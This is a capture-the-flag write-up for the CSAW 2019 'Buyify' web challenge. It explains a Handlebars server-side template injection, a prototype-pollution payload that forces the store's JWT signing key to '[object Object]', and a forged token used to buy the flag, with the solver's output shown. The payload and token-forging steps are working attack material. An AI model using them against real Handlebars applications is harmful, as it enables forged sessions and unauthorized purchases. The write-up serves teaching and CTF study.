# Buyify (Web, 500, 15 solves) by [@terjanq]  
This is a solution of [Buyify] web-task from [CSAW 2019 (Quals)] ctf. The
challenge was created by [@itszn13], was worth 500 points and was solved by 15
teams.

*The challenge was really awesome and since all the [files] required to run the instance locally are provided it could be worth taking a look at it before reading through this write-up*

### A quick look  
We are provided with a simple [website] where we can:  
- visit `flag store` and buy `flag` there  
- create new store  
- update created store description  
- create items in created store

After playing around with the webiste I noticed an interesting template in
*update store description* page

```html  

{{ store_name }} Store

  

Welcome to a store for all things {{ store_name }}

  
```  
Given that, I suspected the problem to be [Server-side Template Injection]
related.

### Handlebars and 0day  
The first thing to try with templates is always `{{7*7}}`. That can quickly
confirm whether we hit the mentioned Template Injection or not. When doing so
a wild error appeared:

```  
Error: Parse error on line 1:  
{{7*7}}  
--^  
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA',
got 'INVALID'  
   at Parser.parseError
(/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)  
   at Parser.parse (/node_modules/handlebars/dist/cjs/h  
....  
```

From reading through the error, we can see that the library responsible for
compiling that template is [handlebars]. Quick research led me to a great
article [Handlebars template injection and RCE in a Shopify app] about a
vulnerability in that library. The mentioned in there vulnerability was
unfortunately patched but all the details, starting with the challenge name,
clearly point to *bypassing* the fix.

However, there was also a hint included

> *HINT: Templates are a prototype for fun and also, don't worry, you don't
> need rce*

that suggests that there is no need for searching for another critical
vulnerability in the library.

In the following sections, I will present a solution split into pieces that
are required to understand the problem and omit all the wrong directions I
took.

### Purchase the flag  
When visiting http://web.chal.csaw.io:1002/store/flag/ we could try to
purchase the flag with the following request beside:

```http  
POST /store/flag/checkout HTTP/1.1  
Host: web.chal.csaw.io:1002  
Content-Length: 158  
Content-Type: application/x-www-form-urlencoded  
Cookie:
connect.sid=s%3AOi5yhl-2orxSQ5iN9KzeprT9FThgtxPX.EXOINstCO0gUpXWeK7URQliyfG6KdI7N9j91IWPFAbY

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjoxMDAwMDAwMDAsImlhdCI6MTU2ODU4Nzg0Mn0.c1RVg_POsjNIT0L0LHBkJ5db12BKPHHbundirMsJdaA  
```

After decoding the token which is an encoded [JSON Web Token] we get a `JSON`
object:

```json  
{  
 "id": "flag.flag",  
 "price": 100000000,  
 "iat": 1568587842  
}  
```

Unfortunately, we only get `$100` on the start so the purchase will not be
completed.

### Token format  
The `id` in the token is created by concatenating `store_name` and the
`item_name`. We can see that happening in [server.js]:

```js  
// Create an item, assign it an id, and store its callback  
function create_item(id, name, callback) {  
 let item_id = `${id}.${name}`;  
 items[item_id] = callback;  
 return item_id;  
}  
```

The token itself is a `jwt` signed with `store.key` which we can find in
[store.js]:

```js  
// Sign an item for sale in the store  
function sign_item(item) {  
 let token = jwt.sign({id:item.id, price:item.price}, store.key);  
 return token;  
}  
```

### Store object  
In the [store.js] we can also notice that the `store` has the following
structure:

```js  
 /* === Instance === */  
 store = {  
   name: name,  
   id: id,  
   items: [],  
   header_template: `

{{ store_name }} Store

  

Welcome to a store for all things {{ store_name }}

`,  
   item_map: {},  
 };  
```

A very odd thing is that the `key` attribute is not defined here, but we saw
earlier that `store.key` was used to encode the token.

In [store.js] we can find a place where `store.key` is actually defined:

```js  
// Invalidate and resign all items  
function update_store() {  
 // Create store key with long random string  
 store.key = crypto.randomBytes(64).toString('hex');

 for (let item of store.items) {  
   item.token = sign_item(item);  
 }  
}  
```

From cryptographic perspective this looks impossible to crack. Let's see when
`update_store()` function is called.

```js  
// Create an item with a given name and price  
function create_item_impl(name, price, cb) {  
 let item = {  
   name: name,  
   price: price,  
 };

 // The server assigns an item id to us that is unique  
item.id = g_create_item(name, cb);

 store.items.push(item);  
 store.item_map[item.id] = item;

 update_store();  
}  
```

From reading the above function it becomes obvious that `store.key` is defined
via `update_store()` and that happens when a new item is created. That will
also update all the previous items in the process. This will come in handy
very soon.

### What if we knew the secret key?  
If we knew the secret key from `store` object we could sign an object `{'id':
'flag.flag', 'price':'1'}` with that key and then by sending a `/checkout`
request from [#Purchase-the-flag](#Purchase-the-flag) section, receive the
flag. That is because of the following part of the[server.js]:

```js  
// Get an item callback  
function get_item(item) {  
 money_count += item.price;  
 return items[item.id];  
}

// Create the Flag store and the Flag item  
stores[create_store('Flag','flag')].create_item('flag', 100000000, (id, req,
res)=>{  
 flag_count++;  
 res.send(`Congrats! Your flag is ${  
     fs.readFileSync('flag.txt').toString().replace(/^\s+|\s+$/g, '')}!`);  
});  
```

There are some security checks being done before accessing the flag but the
crucial one is in `checkout(req, res)` function.

```js  
item = jwt.verify(req.body.token, store.key);  
```

Basically, to access the flag we must make verify function not to throw an
error, i.e. the signature must match the key.

### Let's head back to template injection  
So, I mentioned earlier about this great bug in `Shopify` store that allowed
to get an `RCE` and that does not work anymore. The reason why we cannot get
the remote code execution using that trick is that any attempt to calling the
`constructor` of any object will return `undefined`. Without a `constructor`
it is not trivial to iterate over contexts or to evaluate a string. But in the
hint, it was said that we do not need to achieve `RCE`.

To solve the challenge we would either want to read the `store.key` or
override it with a value known to us. The syntax of [handlebars] is limited
but it has [helper functions] that can do some crazy things. To take advantage
of [#Store-object](#Store-object) we would ideally want to override the Object
prototype and define our own [setter] and [getter] on `key` property so we can
either read the key or replace it with controlled by us value.

In plain `javascript` it could look like:

```js  
 Object.defineProperty(  
   Object.prototype, 'key', {  
    get: function(){  
      return this.toString()  
    }  
    set: function(){  
      return this.toString()  
    }  
  }  
 )  
```

Since we cannot access any `constructor` property, getting reference to
`Object` is a challenging task. But there is another way to define [setter] or
[getter]. There are deprecated features like [\_\_defineSetter\_\_] and
[\_\_defineGetter\_\_] that still work. These can be called in [handlebars]
for example in that payload: `{{this.__proto__.__defineGetter__}}`. I managed
to use this and override the prototype with the following payload:

```js  
{{#with this.__proto__ as |o|}}  
   {{o.__defineGetter__ "key" toString}}  
   {{o.__defineSetter__ "key" toString}}  
{{/with}}  
```

It is equivalent to the `Object.defineProperty` mentioned above. What it does
is:  
1) Setting a context to the prototype of `[object]` and aliasing it to `|o|`
via [#with] helper.  
2) Calling [\_\_defineSetter\_\_] and [\_\_defineGetter\_\_] on
`Object.prototype` with `key` as attribute and `this.toString()` as a callback
that override [setter] and [getter].  
3) After that, accessing `[object].key` on newly created objects shall now
return `[object Object]` as a string and it cannot be overriden using
`[object].key = ...` because we overrode a setter function.

### Win the lottery  
So now, the last missing piece is to forge a valid `token` with `[object
Object]` as a key and `flag.flag` as an id.

```py  
# Forge flag token  
flag_token = jwt.encode({  
   "id": "flag.flag",  
   "price": 1,  
   "iat": 1568568228  
 }, '[object Object]', algorithm='HS256')

```

Then using it to purchase the flag for `$1` in our store.

I automated the process with [solve.py] where I briefly described each step.
By executing the exploit I got the flag
**flag{npm_devs_are_pretty_bad_at_fixing_bugs}**

```sh  
$ python solve.py  
('store_id:', 'fedeb307e6104baf')  
('connect.sid:',
's%3A1vs4vfSD3GEal8dD2lGuRAJgtUk2XIO0.m%2BE252u74l2ffXB1fOAuNPu1awVwzANQmg9KLqOfWmk')  
Congrats! Your flag is flag{npm_devs_are_pretty_bad_at_fixing_bugs}!  
```

[CSAW 2019 (Quals)]:<https://ctftime.org/event/870>  
[@itszn13]:<https://twitter.com/itszn13>  
[website]:<https://github.com/terjanq/Flag-
Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify>  
[handlebars]:<https://handlebarsjs.com/>  
[Handlebars template injection and RCE in a Shopify
app]:<http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-
and-rce.html>  
[store.js]:<./store.js>  
[server.js]:<./server.js>  
[helper functions]:<https://handlebars-draft.knappi.org/guide/block-
helpers.html>  
[setter]:<https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Functions/set>  
[getter]:<https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Functions/get>  
[\_\_defineSetter\_\_]:<https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__>  
[\_\_defineGetter\_\_]:<https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__>  
[solve.py]:<./solve.py>  
[Buyify]:<>  
[@terjanq]:<https://twitter.com/terjanq>  
[files]:<./buyify.tar.gz>  
[Server-side Template Injection]:<https://portswigger.net/blog/server-side-
template-injection>  
[#with]:<https://handlebars-draft.knappi.org/guide/block-helpers.html#the-
with-helper>  
[JSON Web Token]:<https://jwt.io/>

Original writeup (https://github.com/terjanq/Flag-
Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify#buyify-
web-500-15-solves-by-terjanq).